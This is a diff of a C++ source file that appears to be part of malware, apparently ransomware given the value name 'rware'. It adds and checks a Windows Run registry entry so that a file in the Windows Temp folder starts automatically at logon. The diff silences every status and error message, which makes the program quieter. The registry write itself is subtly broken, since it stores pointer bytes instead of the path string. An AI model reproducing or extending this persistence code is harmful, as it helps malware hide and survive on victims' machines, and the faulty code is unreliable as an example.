@@ -7,14 +7,13 @@ int checkForRegkey() {
 
 		if (RegGetValueW(cléRegistre, 0, L"rware", 2, NULL, NULL, NULL) == ERROR_SUCCESS) {
 
-			std::cout << "The key does indeed exist";
 			return 0;
 		}
 		else
 		{
-			DWORD d;
-			d = GetLastError();
-			std::cout << "Failure to check the key, error code 0x" << d << std::endl;
+			//DWORD d;
+			//d = GetLastError();
+			//std::cout << "Failure to check the key, error code 0x" << d << std::endl;
 			RegCloseKey(cléRegistre);
 			return -1;
 		}
@@ -22,14 +21,13 @@ int checkForRegkey() {
 
 	}
 	else {
-		DWORD d;
-		d = GetLastError();
-		std::cout << "Failure to open handle to the regkey, error code 0x" << d << std::endl;
+		//DWORD d;
+		//d = GetLastError();
+		//std::cout << "Failure to open handle to the regkey, error code 0x" << d << std::endl;
 		RegCloseKey(cléRegistre);
 		return -1;
 	};
 
-	return 0;
 }
 
 int setRegkey() {
@@ -38,14 +36,13 @@ int setRegkey() {
 	LPCWSTR path = L"C:\\Windows\\Temp\\truc.txt";
 	if (RegSetKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"rware", REG_SZ, LPBYTE(&path), sizeof(path)) == ERROR_SUCCESS) {
 
-		std::cout << "Key created" << std::endl;
+		//std::cout << "Key created" << std::endl;
 		return 0;
 	}
 	else {
-		DWORD d;
-		d = GetLastError();
-		std::cout << "Failure to create the regkey, error code 0x" << d << std::endl;
-
+		//DWORD d;
+		//d = GetLastError();
+		//std::cout << "Failure to create the regkey, error code 0x" << d << std::endl;
 		return -1;
 
 	}
